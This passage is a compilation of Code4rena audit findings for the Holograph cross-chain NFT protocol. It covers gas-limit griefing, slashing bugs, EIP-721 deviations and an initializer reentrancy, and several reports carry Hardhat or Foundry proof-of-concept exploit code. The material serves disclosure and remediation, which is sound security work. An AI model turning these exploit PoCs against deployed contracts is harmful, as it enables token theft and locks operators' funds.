operatorMock.testExecuteJob({value: 500});          // even though the job is not successfully executed, the sent ETH is locked in operatorMock contract         const isJobExecuted = await operatorMock.isJobExecuted();         expect(isJobExecuted).to.be.eq(false);         expect(await ethers.provider.getBalance(operatorMock.address)).to.be.eq(500);     }); }); ```  Last, please run `npx hardhat test test/POC.ts --network hardhat`. The `It is possible that operator loses sent ETH after calling HolographOperator contract's executeJob function` test will pass to demonstrate the described scenario.  ## Tools Used VSCode  ## Recommended Mitigation Steps In the `catch` block of the `try ... {...} catch {...}` code mentioned above in the Impact section, the code can be updated to transfer the `msg.value` amount of ETH back to the operator, which is `msg.sender` for the `HolographOperator` contract's `executeJob` function, when this described situation occurs.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peiw-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L415   # Vulnerability details   When a beaming job is executed, there's a requirement that the gas left would be at least as the `gasLimit` set by the user. Given that there's no limit on the `gasLimit` the user can set, a user can set the `gasLimit` to amount that's higher than the block gas limit on the dest chain, causing the operator to fail to execute the job.  ## Impact Operators would be locked out of the pod, unable to execute any more jobs and not being able to get back the bond they paid.  The attacker would have to pay a value equivalent to the gas fee if that amount was realistic (i.e. `gasPrice` * `gasLimit` in dest chain native token), but this can be a relative low amount for Polygon and Avalanche chain (for Polygon that's 20M gas limit and 200 Gwei gas = 4 Matic, for Avalanche the block gas limit seems to be 8M and the price ~30 nAVAX = 0.24 AVAX ). Plus, the operator isn't going to receive that amount.  ## Proof of Concept The following test demonstrates this scenario:  ```diff diff --git a/test/06_cross-chain_minting_tests_l1_l2.ts b/test/06_cross-chain_minting_tests_l1_l2.ts index 1f2b959..a1a23b7 100644 --- a/test/06_cross-chain_minting_tests_l1_l2.ts +++ b/test/06_cross-chain_minting_tests_l1_l2.ts @@ -276,6 +276,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              gasLimit: TESTGASLIMIT,            })          ); +        estimatedGas = BigNumber.from(50_000_000);          // process.stdout.write('\n' + 'gas estimation: ' + estimatedGas.toNumber() + '\n');            let payload: BytesLike = await l1.bridge.callStatic.getBridgeOutRequestPayload( @@ -303,7 +304,8 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              '0x' + remove0x((await l1.operator.getMessagingModule()).toLowerCase()).repeat(2),              payload            ); - +        estimatedGas = BigNumber.from(5_000_000); +                  process.stdout.write(' '.repeat(10) + 'expected lz gas to be ' + executeJobGas(payload, true).toString());          await expect(            adminCall(l2.mockLZEndpoint.connect(l2.lzEndpoint), l2.lzModule, 'lzReceive', [ @@ -313,7 +315,7 @@ describe('Testing cross-chain minting (L1 & L2)', async function () {              payload,              {                gasPrice: GASPRICE, -              gasLimit: executeJobGas(payload), +              gasLimit: 5_000_000,              },            ])          ) ```  The test would fail with the following output:  ```   1) Testing cross-chain minting (L1 & L2)        Deploy cross-chain contracts via bridge deploy          hToken            deploy l1 equivalent on l2:      VM Exception while processing transaction: revert HOLOGRAPH: not enough gas left ```  ## Recommended Mitigation Steps Limit the `gasLimit` to the maximum realistic amount that can be used on the dest chain (including the gas used up to the point where it's checked).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/rbserver-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Metatron-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0xSmartContract-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/i_got_hacked-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakshamguruji-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/aysha-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/delfin454000-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ryshaw-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/JrNet-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L202-L340 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L593-L596 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/module/LayerZeroModule.sol#L277-L294   # Vulnerability details  During the beaming process the user compensates the operator for the gas he has to pay by sending some source-chain-native-tokens via `hToken`. The amount he has to pay is determined according to the `gasPrice` set by the user, which is supposed to be the maximum gas price to be used on dest chain (therefore predicting the max gas fee the operator would pay and paying him the same value in src chain native tokens). However, in case the user sets a low price (as low as 1 wei) the operator can't skip the job because he's locked out of the pod till he executes the job. The operator would have to choose between loosing money by paying a higher gas fee than he's compensated for or being locked out of the pod - not able to execute additional jobs or get back his bonded amount.   ## Impact Operator would be loosing money by having to pay gas fee that's higher than the compensation (gas fee can be a few dozens of USD for heavy txs). This could also be used by attackers to make operators pay for the attackers' expensive gas tasks: * They can deploy their own contract as the 'source contract' * Use the `bridgeIn` event and the `data` that's being sent to it to instruct the source contract what operations need to be executed * They can use it for execute operations where the `tx.origin` doesn't matter (e.g. USDc gasless send)  ## Proof of Concept * An operator can't execute any further jobs or leave the pod till the job is executed. From [the docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification#:~:text=When%20an%20operator%20is%20selected%20for%20a%20job%2C%20they%20are%20temporarily%20removed%20from%20the%20pod%2C%20until%20they%20complete%20the%20job.%20If%20an%20operator%20successfully%20finalizes%20a%20job%2C%20they%20earn%20a%20reward%20and%20are%20placed%20back%20into%20their%20selected%20pod.): > When an operator is selected for a job, they are temporarily removed from the pod, until they complete the job. If an operator successfully finalizes a job, they earn a reward and are placed back into their selected pod. * Operator can't skip a job. Can't prove a negative but that's pretty clear from reading the code. * There's indeed a third option - that some other operator/user would execute the job instead of the selected operator, but a) the operator would get slashed for that. b) If the compensation is lower than the gas fee then other users have no incentive to execute it as well.  ## Recommended Mitigation Steps  Allow operator to opt out of executing the job if the `gasPrice` is higher than the current gas price
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/B2-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Dinesh11G-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/djxploit-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Pheonix-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/lukris02-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/svskaushik-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/halden-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Tomio-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/__141345__-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Waze-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/pedr02b2-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L849-L857   # Vulnerability details  ## Impact Bond tokens (HLG) equal to the slash amount will get permanently stuck in the HolographOperator each time a job gets executed by someone who is not an (fallback-)operator.  ## Proof of Concept The `HolographOperator.executeJob` function can be executed by anyone after a certain passage of time:  ```js ... if (job.operator != address(0)) {     ...     if (job.operator != msg.sender) {         //perform time and gas price check         if (timeDifference < 6) {             // check msg.sender == correct fallback operator         }         // slash primary operator         uint256 amount = _getBaseBondAmount(pod);         _bondedAmounts[job.operator] -= amount;         _bondedAmounts[msg.sender] += amount;          //determine if primary operator retains his job         if (_bondedAmounts[job.operator] >= amount) {             ...         } else {             ...         }     } } // execute the job ``` In case `if (timeDifference < 6) {` gets skipped, the slashed amount will be assigned to the `msg.sender` regardless if that sender is currently an operator or not. The problem lies within the fact that if `msg.sender` is not already an operator at the time of executing the job, he cannot become one after, to retrieve the reward he got for slashing the primary operator. This is because the function `HolographOperator.bondUtilityToken` requires `_bondedAmounts` to be 0 prior to bonding and hence becoming an operator:  ```js require(_bondedOperators[operator] == 0 && _bondedAmounts[operator] == 0, "HOLOGRAPH: operator is bonded"); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Assuming that it is intentional that non-operators can execute jobs (which could make sense, so that a user could finish a bridging process on his own, if none of the operators are doing it): remove the requirement that `_bondedAmounts` need to be 0 prior to bonding and becoming an operator so that non-operators can get access to the slashing reward by unbonding after.  Alternatively (possibly preferrable), just add a method to withdraw any `_bondedAmounts` of non-operators.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/hxzy-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/oyc_109-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/peanuts-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/cryptostellar5-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mukund-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382   # Vulnerability details  ## Impact  Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.  ## Proof of Concept  [Docs](https://docs.holograph.xyz/holograph-protocol/operator-network-specification): If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.  The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole _getBaseBondAmount() fee is [slashed from the job.operator instead.](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382)  ```         uint256 amount = _getBaseBondAmount(pod);         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Documentation states that only a portion should be slashed and the number of slashes should be noted down.   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Diana-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jeiwan-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ReyAdmirado-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577   # Vulnerability details  ## Impact A source contract can burn and transfer NFTs of users without their permission. ## Proof of Concept Every Holographed ERC721 collection is paired with a source contract, which is the user created contract that's extended by the Holographed ERC721 contract ([HolographFactory.sol#L234-L246](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L234-L246)). A source contract, however, has excessive privileges in the Holographed ERC721. Specifically, it can burn and transfer users' NFTs without their approval ([HolographERC721.sol#L500](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L500), [HolographERC721.sol#L577](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L577)): ```solidity function sourceBurn(uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _burn(wallet, tokenId); }  function sourceTransfer(address to, uint256 tokenId) external onlySource {   address wallet = _tokenOwner[tokenId];   _transferFrom(wallet, to, tokenId); } ```  While this might be desirable for extensibility and flexibility, this puts users at the risk of being robbed by the source contract owner or a hacker who hacked the source contract owner's key. ## Tools Used Manual review ## Recommended Mitigation Steps Consider removing the `sourceBurn` and `sourceTransfer` functions of `HolographERC721` and requiring user approval to transfer or burn their tokens (`burn` and `safeTransferFrom` can be called by a source contract instead of `sourceBurn` and `sourceTransfer`).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/martin-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Shinchan-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/ch0bu-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/karanctf-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bin2chen-Q.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392   # Vulnerability details  ## Impact beforeApprovalAll() / afterApprovalAll() can only pass "to" and "approved", missing "owner", if contract listening to this event,but does not know who approve it, so can not react to this event Basically, this event cannot be used  ## Proof of Concept ```   function setApprovalForAll(address to, bool approved) external { ....      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {       require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner     }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {       require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner     }   } ```  ## Tools Used  ## Recommended Mitigation Steps   add parameter: owner   ``` interface HolographedERC721 { ...  - function beforeApprovalAll(address _to, bool _approved) external returns (bool success); + function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);  - function afterApprovalAll(address _to, bool _approved) external returns (bool success); + function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success); ```  ```   function setApprovalForAll(address to, bool approved) external {      if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) { -     require(SourceERC721().beforeApprovalAll(to, approved));  +     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved));      }        _operatorApprovals[msg.sender][to] = approved;      if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) { -      require(SourceERC721().afterApprovalAll(to, approved)); +      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));     }   } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/iepathos-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/catchup-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/vv7-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/erictee-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L147-L169   # Vulnerability details  When new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.  However, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.   One way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.  ## Proof of Concept: ``` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol"; import "../contracts/HolographFactory.sol"; import "../contracts/HolographRegistry.sol"; import "../contracts/Holograph.sol"; import "../contracts/enforcer/HolographERC20.sol";  //Contract used to show reentrancy in initializer contract SourceContract {     address public holographer;     MockContract public mc;      constructor() {          mc = new MockContract();     }      //function that reenters the holographer and sets this contract as the new holograph slot     function init(bytes memory initPayload) external returns(bytes4) {         assembly {             sstore(holographer.slot, caller())         }         bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32("0xabc"), address(this)), bytes("0x0"));          holographer.call(abi.encodeWithSignature("init(bytes)", initCode));         return InitializableInterface.init.selector;     }      function getRegistry() external view returns (address) {         return address(this);     }      function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {         return address(mc);     }      function isTheHolograph() external pure returns (bool) {         return true;     }  }  //simple extension contract to return easily during reinitialization contract MockContract {     constructor() {}      function init(bytes memory initPayload) external pure returns(bytes4) {         return InitializableInterface.init.selector;     } }  contract HolographTest is Test {     DeploymentConfig public config;     Verification public verifiedSignature;     HolographFactory public hf;     HolographRegistry public hr;     Holograph public h;     HolographERC20 public he20;      uint256 internal userPrivateKey;     address internal hrAdmin;     mapping(uint256 => bool) public _burnedTokens;     address internal user;     function setUp() public {         //Creating all of the required objects         hf = new HolographFactory();         hr = new HolographRegistry();         h = new Holograph();         he20 = new HolographERC20();          //Setting up the registry admin         hrAdmin = vm.addr(100);          //Creating factory, holograph, and registry init payloads         bytes memory hfInitPayload = abi.encode(address(h), address(hr));         hf.init(hfInitPayload);         bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));         h.init(hInitPayload);         bytes32[] memory reservedTypes = new bytes32[](1);         reservedTypes[0] = "0xabc";         bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);          //Setting up a contract type address for the ERC20 enforcer         vm.startPrank(hrAdmin, hrAdmin);         hr.init(hrInitPayload);         hr.setContractTypeAddress(reservedTypes[0], address(he20));         vm.stopPrank();          //Keys used to sign transaction for deployment         userPrivateKey = 0x1337;         user = vm.addr(userPrivateKey);     }      function testDeployShadyHolographer() public {         //setting up the configuration, contract type is not important         config.contractType = "0xabc";         config.chainType = 1;         config.salt = "0x12345";         config.byteCode = type(SourceContract).creationCode;         bytes memory initCode = "0x123";          //giving our token some semi-realistic metadata         config.initCode = abi.encode("HToken", "HT", uint8(18), uint256(0), "HTdomainSeparator", "HTdomainVersion", false, initCode);          //creating the hash for our user to sign         bytes32 hash = keccak256(             abi.encodePacked(                 config.contractType,                 config.chainType,                 config.salt,                 keccak256(config.byteCode),                 keccak256(config.initCode),                 user             ));          //signing the hash and creating the verified signature         (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);         verifiedSignature.r = r;         verifiedSignature.v = v;         verifiedSignature.s = s;          //deploying our new source contract and holographable contract pair         hf.deployHolographableContract(config, verifiedSignature, user);          //after the reentrancy has affected the initialization, we grab the holographer address from the registry         address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));          //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract         assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);     } } ``` ## Recommended Mitigation Steps  Consider checking whether the contract is in an "initializing" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements. 
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272   # Vulnerability details  ## Impact According to EIP-721, we have for `approve`: ```solidity ///  Throws unless `msg.sender` is the current NFT owner, or an authorized ///  operator of the current owner. ``` An operator in the context of EIP-721 is someone who was approved via `setApprovalForAll`: ```solidity /// @notice Enable or disable approval for a third party ("operator") to manage ///  all of `msg.sender`'s assets /// @dev Emits the ApprovalForAll event. The contract MUST allow ///  multiple operators per owner. /// @param _operator Address to add to the set of authorized operators /// @param _approved True if the operator is approved, false to revoke approval function setApprovalForAll(address _operator, bool _approved) external; ``` Besides operators, there are also approved addresses for a token (for which `approve` is used). However, approved addresses can only transfer the token, see for instance the `safeTransferFrom` description: ```solidity /// @dev Throws unless `msg.sender` is the current owner, an authorized ///  operator, or the approved address for this NFT. ``` `HolographERC721` does not distinguish between authorized operators and approved addresses when it comes to the `approve` function. Because `_isApproved(msg.sender, tokenId)` is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).  ## Proof Of Concept Bob calls `approve` to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue `HolographERC721` did not follow EIP-721, it was possible.  ## Recommended Mitigation Steps Follow the EIP, i.e. do not allow approved addresses to approve other addresses.
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366   # Vulnerability details  ## Impact According to EIP-721, we have the following for `safeTransferFrom`: ```solidity ///  (...) When transfer is complete, this function ///  checks if `_to` is a smart contract (code size > 0). If so, it calls ///  `onERC721Received` on `_to` and throws if the return value is not ///  `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`. ``` According to the specification, the function must therefore always call `onERC721Received`, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for `ERC721TokenReceiver` does not mention ERC-165. For the token itself, we have: `interface ERC721 /* is ERC165 */ {` However, for the receiver, the provided interface there is just: `interface ERC721TokenReceiver {` This leads to failed transfers when they should not fail, because many receivers will just implement the `onERC721Received` function (which is sufficient according to the EIP), and not `supportsInterface` for ERC-165 support.  ## Proof Of Concept Let's say a receiver just implements the `IERC721Receiver` from OpenZeppelin: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol Like the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the `require` statement (that checks for ERC-165 support) reverts.  ## Recommended Mitigation Steps Remove the ERC-165 check in the `require` statement (like OpenZeppelin does: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436)
See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Jujic-G.md).
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675   # Vulnerability details  ## Impact  bidShares returned are incorrect leading to incorrect royalties  ## Proof of Concept  [Zora Market](https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113)      function isValidBidShares(BidShares memory bidShares)         public         pure         override         returns (bool)     {         return             bidShares.creator.value.add(bidShares.owner.value).add(                 bidShares.prevOwner.value             ) == uint256(100).mul(Decimal.BASE);     }  Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.     ## Tools Used  Manual Review  ## Recommended Mitigation Steps  To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 ** 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 ** (18 - 2) or 10 ** 16:       function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {         // this information is outside of the scope of our         bidShares.prevOwner.value = 0;         bidShares.owner.value = 0;         if (_getReceiver(tokenId) == address(0)) {     -       bidShares.creator.value = _getDefaultBp();     +       bidShares.creator.value = _getDefaultBp() * (10 ** 16);         } else {     -       bidShares.creator.value = _getBp(tokenId);     +       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);         }         return bidShares;     }
# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L316   # Vulnerability details  There's a check at line 316 that verifies that there's enough gas left to execute the `HolographBridge.bridgeInRequest()` with the `gasLimit` set by the user, however the actual amount of gas left during the call is less than that (mainly due to the 1/64 rule, see below). An attacker can use that gap to fail the job while still having the `executeJob()` function complete.   ## Impact The owner of the bridged token would loose access to the token since the job failed.  ## Proof of Concept Besides using a few units of gas between the check and the actual call, there's also a rule that only 63/64 of the remaining gas would be dedicated to an (external) function call. Since there are 2 external function calls done (`nonRevertingBridgeCall()` and the actual call to the bridge) ~2/64 of the gas isn't sent to the bridge call and can be used after the bridge call runs out of gas.   The following PoC shows that if the amount of gas left before the call is at least 1 million then the execution can continue after the bridge call fails:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0;  import "forge-std/Test.sol";  contract ContractTest is Test {     event FailedOperatorJob(bytes32 jobHash);     uint256 private _inboundMessageCounter;     mapping(bytes32 => bool) private _failedJobs;     constructor(){         _inboundMessageCounter = 5;     }     function testGas64() public {         this.entryPoint{gas:1000000}();     }      Bridge bridge = new Bridge();     event GasLeftAfterFail(uint left);      function entryPoint() public {          console2.log("Gas left before call: ", gasleft());          bytes32 hash = 0x987744358512a04274ccfb3d9649da3c116cd6b19c535e633ef8529a80cb06a0;          try this.intermediate(){         }catch{             // check out how much gas is left after the call to the bridge failed             console2.log("Gas left after failure: ", gasleft());             // simulate operations done after failure             _failedJobs[hash] = true;             emit FailedOperatorJob(hash);         }         ++_inboundMessageCounter;         console2.log("Gas left at end: ", gasleft());      }      function intermediate() public{         bridge.bridgeCall();     } }   contract Bridge{     event Done(uint gasLeft);      uint256[] myArr;      function bridgeCall() public {         for(uint i =1; i <= 100; i++){             myArr.push(i);         }         // this line would never be reached, we'll be out of gas beforehand         emit Done(gasleft());     } }  ```  Output of PoC: ```   Gas left before call:  999772   Gas left after failure:  30672   Gas left at end:  1628 ```  Side note: due to some bug in forge `_inboundMessageCounter` would be considered warm even though it's not necessarily the case. However in a real world scenario we can warm it up if the selected operator is a contract and we'er using another operator contract to execute a job in the same tx beforehand.   Reference for the 1/64 rule - [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md). Also check out 